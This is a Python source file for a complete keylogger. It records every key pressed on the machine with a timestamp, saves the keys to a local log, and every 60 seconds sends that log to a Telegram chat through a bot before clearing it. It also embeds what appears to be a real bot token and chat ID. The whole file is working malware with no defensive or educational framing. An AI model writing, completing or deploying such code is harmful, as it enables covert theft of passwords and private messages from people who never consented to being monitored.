import keyboard
import telebot
import os
from threading import Timer
from datetime import datetime

# Telegram Config
BOT_TOKEN = "7668132689:AAF9u8pHOdiU4bkBURY0yofjLR49XHpt0Vg"  # From @BotFather
CHAT_ID = "5633755314"      # From @RawDataBot (numeric, no quotes if it's a number)
bot = telebot.TeleBot(BOT_TOKEN)

LOG_FILE = "keystrokes.log"

def on_key_press(event):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {event.name}\n")

def send_logs():
    try:
        # Ensure file exists
        if not os.path.exists(LOG_FILE):
            open(LOG_FILE, 'w').close()
            
        # Only send if file has content
        if os.path.getsize(LOG_FILE) > 0:
            with open(LOG_FILE, "rb") as f:
                bot.send_document(CHAT_ID, f)
    except Exception as e:
        print(f"Error: {e}")  # Print to console for debugging
        # bot.send_message(CHAT_ID, f"Error sending logs: {e}")

    # Reset & schedule next send
    open(LOG_FILE, "w").close()
    Timer(60, send_logs).start()

# Start keylogger
keyboard.on_press(on_key_press)
send_logs()
keyboard.wait()